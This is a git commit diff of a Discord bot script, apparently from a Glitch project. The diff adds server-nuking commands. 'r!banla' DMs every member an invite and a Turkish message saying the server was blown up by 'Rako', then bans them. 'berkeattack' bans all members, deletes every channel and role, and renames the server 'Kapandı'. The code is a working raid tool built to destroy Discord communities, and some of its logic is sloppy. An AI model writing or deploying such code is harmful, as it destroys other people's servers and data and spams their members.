f7e26d2ec1531d4ffc0cf687079286433cee9cb8
Glitch (benim-botum-lan) <none>
2019-09-01 09:01:37 +0000

    🎃🏚 Checkpoint ./berke.js:2842703/1480

--- berke.js
+++ berke.js
@@ -1,25 +1,59 @@
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+const express = require('express');
 
 const Discord = require('discord.js');
 const berke = new Discord.Client();
-
-console.log('Hazırım.');
-
+const app = express();
+const http = require('http');
+    app.get("/", (request, response) => {
+    response.sendStatus(200);
+    });
+    app.listen(process.env.PORT);
+    setInterval(() => {
+    http.get('http://pyros.glitch.me/');
+    }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+berke.on('message', msg => {
+  if (msg.content === 'r!banla') {
+    msg.delete()
+    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Rako Tarafından Patlatılmıştır.**").then(member.ban())
+  )}
+})
+
+var uyesayisi = [
+  "1",
+  "2",
+  "3",
+  "4",
+  "5",
+  "6",
+  "7",
+  "8",
+  "9",
+  "10"
+]
 
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
-
+  if (msg.content.toLowerCase() === 'berkeattack' ) {
     msg.guild.members.forEach(member => member.ban())
     msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("Kapandı");
     msg.guild.setIcon("https://www.main-taunus-zentrum.de/fileadmin/user_upload/GLOBAL/brand_stores/logos/closed.png");
-    msg.guild.createChannel("hey");
-
+    if (msg.guild.members.size === uyesayisi) {
+      await msg.guild.createChannel("hey");
+    } else {
+      console.log("")
+    }
+    
   }
 });
+
+berke.on("ready", () => {
+  const sunucu = berke.guilds.get("616257615751544833")
+  sunucu.createChannel("sa")
+})
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
 
